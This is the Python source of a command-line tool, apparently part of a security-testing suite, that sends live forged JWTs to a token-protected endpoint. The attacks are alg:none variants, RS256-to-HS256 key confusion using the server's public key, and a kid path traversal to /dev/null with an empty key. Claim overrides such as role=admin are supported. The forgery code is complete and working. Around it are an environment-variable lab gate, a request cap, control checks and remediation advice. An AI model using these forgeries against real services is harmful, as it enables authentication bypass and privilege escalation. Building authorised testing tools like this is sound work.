"""[EXPLOIT: lab-only] jwt-lab — live JWT forgery differential against a
token-protected endpoint in YOUR lab: alg:none, RS256->HS256 key
confusion, and `kid` path traversal (publicly documented N-day classes,
CWE-347 / CWE-22).

Gate (core/lab_gate.py, checked before the first request): env LAB=1 is
required; a non-loopback target also needs LAB_REMOTE_ACK=<written
reason>. No flag can replace either. Refusal = exit 2.

Niche vs existing code (anti-duplication):
  - tools/jwt_crypto_attack.py is OFFLINE arithmetic on a captured token
    (weak secret, confusion maths) and leaves "does the server accept
    it?" as a next step. This script IS that next step.
  - exploit_playbooks JwtAlgConfusion covers alg:none inside the exploit
    engine (config-driven). This is a standalone CLI that adds key
    confusion and kid traversal, usable on any lab verifier.

Mechanism (bounded: at most MAX_REQUESTS GETs, no state change):
  1. baseline  : request WITHOUT a token          -> must be rejected
  2. control   : well-formed token, random HMAC key -> must be rejected
     (if either is accepted there is nothing to forge -> no L3 claim)
  3. forgeries : alg none/None/NONE (empty signature);
                 HS256 signed with the server's PUBLIC key bytes
                 (needs --pubkey; public information by definition);
                 HS256 with kid=../../../../../../../../dev/null and an
                 EMPTY key (verifier reads the key from a kid path)
  4. every accepted forgery is sent a SECOND time; only a forgery
     accepted twice while baseline+control were rejected is claimed
     (L3, evidence_kind poc-exploit). Accepted once = L1 lead.
"Accepted" = HTTP 2xx, and --marker (if given) present in the body.

The forged token carries benign marker claims (sub=secai-lab-forged) or
your own low-privilege --token's claims with --claim overrides. Nothing
is written to the target; tokens are printed as PoC (lab use).

Exit: 0 report written; 2 refused / input error.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import secrets
import sys
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "core"))
from findings import make_finding, write_findings  # noqa: E402
import lab_gate  # noqa: E402

TOOL = "jwt-lab"
SCHEMA = "secai.jwt-lab/1"
TIMEOUT_S = 10.0
MAX_REQUESTS = 20
KID_TRAVERSAL = "../../../../../../../../dev/null"
DEFAULT_CLAIMS = {"sub": "secai-lab-forged", "secai_lab": True}


def _b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64u_dec(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def sign(header: dict, claims: dict, key: "bytes | None") -> str:
    """Compact JWS. key=None -> unsigned (alg none) token."""
    h = _b64u(json.dumps(header, separators=(",", ":")).encode())
    p = _b64u(json.dumps(claims, separators=(",", ":")).encode())
    si = f"{h}.{p}".encode("ascii")
    if key is None:
        return f"{h}.{p}."
    return f"{h}.{p}.{_b64u(hmac.new(key, si, hashlib.sha256).digest())}"


def claims_from_token(token: str) -> dict:
    """Payload of a user-supplied token (decoded WITHOUT verification)."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError("--token is not a compact JWS (3 segments)")
    data = json.loads(_b64u_dec(parts[1]))
    if not isinstance(data, dict):
        raise ValueError("--token payload is not a JSON object")
    return data


def build_attempts(claims: dict, pubkey: "bytes | None") -> list[dict]:
    """Deterministic attempt list: (name, token, class, cwe)."""
    out = []
    for alg in ("none", "None", "NONE"):
        out.append({"name": f"alg-{alg}", "cls": "alg-none",
                    "cwe": "CWE-347",
                    "token": sign({"alg": alg, "typ": "JWT"}, claims, None)})
    if pubkey:
        variants = [("pem-exact", pubkey)]
        stripped = pubkey.rstrip(b"\r\n")
        if stripped != pubkey:
            variants.append(("pem-no-trailing-newline", stripped))
        for vname, key in variants:
            out.append({"name": f"rs-hs-confusion-{vname}",
                        "cls": "key-confusion", "cwe": "CWE-347",
                        "token": sign({"alg": "HS256", "typ": "JWT"},
                                      claims, key)})
    out.append({"name": "kid-traversal-dev-null", "cls": "kid-traversal",
                "cwe": "CWE-22",
                "token": sign({"alg": "HS256", "typ": "JWT",
                               "kid": KID_TRAVERSAL}, claims, b"")})
    return out


def _get(url: str, token: "str | None") -> dict:
    headers = {"User-Agent": "secai-jwt-lab"}
    if token is not None:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT_S) as r:
            return {"status": r.status,
                    "body": r.read(16_000).decode("utf-8", "replace")}
    except urllib.error.HTTPError as e:
        return {"status": e.code,
                "body": (e.read(4_000) or b"").decode("utf-8", "replace")}
    except Exception as exc:  # noqa: BLE001 — network failure = no claim
        return {"status": None, "body": "",
                "error": f"{type(exc).__name__}: {exc}"[:160]}


def accepted(resp: dict, marker: "str | None") -> bool:
    st = resp.get("status")
    if st is None or not (200 <= st < 300):
        return False
    return marker is None or marker in (resp.get("body") or "")


def audit(url: str, obs: dict, marker: "str | None" = None
          ) -> tuple[list[dict], dict]:
    """Pure: observations -> (rows, meta).

    obs = {"baseline": resp, "control": resp,
           "attempts": [{name, cls, cwe, token, first: resp,
                         second: resp | None}]}
    """
    rows: list[dict] = []
    base_ok = accepted(obs["baseline"], marker)
    ctrl_ok = accepted(obs["control"], marker)
    net_fail = obs["baseline"].get("status") is None
    meta = {"url": url, "schema": SCHEMA, "baseline_accepted": base_ok,
            "control_accepted": ctrl_ok, "network_error": net_fail,
            "attempts": len(obs["attempts"]), "proven": []}
    common = {"tool": TOOL, "target_url": url, "finding_class": "weakness",
              "lab_only": True}
    if net_fail:
        rows.append(make_finding(
            **common, title=f"Target unreachable: {url} — no claim",
            severity="info", evidence_kind="request-response",
            description="Baseline request failed at the network level "
                        f"({obs['baseline'].get('error', '')}); fail-closed.",
            status="confirmed", verdict=0, confidence=1.0,
            extra={"category": "AMAN", "safety_class": "active-probe"}))
        return rows, meta
    if base_ok or ctrl_ok:
        why = ("accepts requests with NO token" if base_ok else
               "accepts a token signed with a RANDOM key")
        rows.append(make_finding(
            **common, title=f"Forgery differential not applicable: {url} "
                            f"{why}",
            severity="info" if base_ok else "medium",
            evidence_kind="request-response",
            description=(f"The endpoint {why}, so a forged token proves "
                         "nothing about the verifier. "
                         + ("Endpoint appears public." if base_ok else
                            "Signature verification may be absent "
                            "entirely — LEAD: confirm with the owner's "
                            "verifier config / code review.")),
            response=(obs["control"].get("body") or "")[:200],
            status="confirmed", verdict=0 if base_ok else 1,
            confidence=1.0,
            cwe=None if base_ok else "CWE-347",
            extra={"category": "AMAN" if base_ok else "LEAD",
                   "safety_class": "active-probe"}))
        return rows, meta
    for a in obs["attempts"]:
        first = accepted(a["first"], marker)
        second = a.get("second") is not None and accepted(a["second"],
                                                          marker)
        if first and second:
            meta["proven"].append(a["name"])
            rows.append(make_finding(
                **common,
                title=f"JWT forgery accepted ({a['cls']}: {a['name']}) "
                      f"on {url}",
                severity="critical" if a["cls"] != "alg-none" else "high",
                description=(
                    "Differential reproduced twice: request without token "
                    f"-> {obs['baseline'].get('status')}, token with "
                    f"random-key signature -> {obs['control'].get('status')}"
                    f", forged token ({a['name']}) -> "
                    f"{a['first'].get('status')} and "
                    f"{a['second'].get('status')}. The verifier trusts "
                    "attacker-controlled token metadata."),
                recommendation=_FIX[a["cls"]], cwe=a["cwe"],
                request=f"GET {url}\nAuthorization: Bearer {a['token']}",
                response=(a["first"].get("body") or "")[:300],
                poc=a["token"], evidence_kind="poc-exploit",
                status="confirmed", verdict=3, confidence=1.0,
                extra={"category": "PROVEN", "safety_class": "active-probe",
                       "attack": a["name"], "class": a["cls"]}))
        elif first:
            rows.append(make_finding(
                **common,
                title=f"JWT forgery accepted once, not reproduced "
                      f"({a['name']}) on {url}",
                severity="medium",
                description="Forged token accepted on first send only — "
                            "flaky or stateful verifier; LEAD, not proof.",
                cwe=a["cwe"], poc=a["token"],
                evidence_kind="request-response", status="confirmed",
                verdict=1, confidence=0.5,
                extra={"category": "LEAD", "safety_class": "active-probe",
                       "attack": a["name"]}))
    if not meta["proven"] and not any(r["verdict"] == 1 for r in rows):
        rows.append(make_finding(
            **common, title=f"No JWT forgery accepted on {url}",
            severity="info", evidence_kind="request-response",
            description=f"{len(obs['attempts'])} forgeries rejected while "
                        "baseline and control were rejected too — the "
                        "verifier pins algorithm and key for these classes.",
            status="confirmed", verdict=0, confidence=1.0,
            extra={"category": "AMAN", "safety_class": "active-probe"}))
    return rows, meta


_FIX = {
    "alg-none": "Reject alg 'none' in every case form; pin the expected "
                "algorithm server-side (never read it from the token).",
    "key-confusion": "Pin the algorithm per key: an RSA public key must "
                     "only ever verify RS*/PS* signatures. Use a library "
                     "API that takes the expected algorithm explicitly.",
    "kid-traversal": "Treat kid as an opaque identifier looked up in an "
                     "allowlist/keystore — never as a filesystem path; "
                     "reject empty keys.",
}


def main(argv: "list[str] | None" = None) -> int:
    ap = argparse.ArgumentParser(
        description="[EXPLOIT: lab-only] jwt-lab: live JWT forgery "
                    "differential (alg:none, RS->HS confusion, kid "
                    "traversal). Requires env LAB=1.")
    ap.add_argument("--url", required=True,
                    help="token-protected endpoint in your lab (GET)")
    ap.add_argument("--token", default=None,
                    help="your own valid low-privilege token (claims are "
                         "reused; decoded without verification)")
    ap.add_argument("--pubkey", default=None,
                    help="server PUBLIC key PEM file (enables RS->HS "
                         "confusion attempts)")
    ap.add_argument("--claim", action="append", default=[],
                    help="claim override k=v (repeatable), e.g. role=admin")
    ap.add_argument("--marker", default=None,
                    help="substring an accepted response must contain")
    ap.add_argument("--out", default="jwt_lab.json")
    args = ap.parse_args(argv)

    refused, gate = lab_gate.check(args.url, TOOL)
    if refused is not None:
        return refused
    try:
        claims = (claims_from_token(args.token) if args.token
                  else dict(DEFAULT_CLAIMS))
        for kv in args.claim:
            k, sep, v = kv.partition("=")
            if not sep or not k.strip():
                raise ValueError(f"--claim must be k=v: {kv!r}")
            claims[k.strip()] = v
        pubkey = Path(args.pubkey).read_bytes() if args.pubkey else None
    except (OSError, ValueError) as exc:
        print(f"[{TOOL}] input error: {exc}", file=sys.stderr)
        return 2

    attempts = build_attempts(claims, pubkey)
    control = sign({"alg": "HS256", "typ": "JWT"}, claims,
                   secrets.token_bytes(32))
    sent = 0
    obs = {"baseline": _get(args.url, None)}
    sent += 1
    obs["control"] = _get(args.url, control)
    sent += 1
    obs["attempts"] = []
    # forgeries only make sense when BOTH baseline and control are
    # rejected — otherwise the differential is void: send nothing more
    if obs["baseline"].get("status") is not None and not (
            accepted(obs["baseline"], args.marker)
            or accepted(obs["control"], args.marker)):
        for a in attempts:
            if sent >= MAX_REQUESTS:
                break
            a = dict(a, first=_get(args.url, a["token"]), second=None)
            sent += 1
            if accepted(a["first"], args.marker) and sent < MAX_REQUESTS:
                a["second"] = _get(args.url, a["token"])
                sent += 1
            obs["attempts"].append(a)
    rows, meta = audit(args.url, obs, args.marker)
    meta.update(gate)
    meta.update({"requests": sent, "safety_class": "active-probe",
                 "tier": "exploit-lab", "lab_only": True})
    write_findings(args.out, rows, meta)
    print(f"{TOOL}: {len(rows)} row(s), proven={meta['proven']} "
          f"({sent} request) -> {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
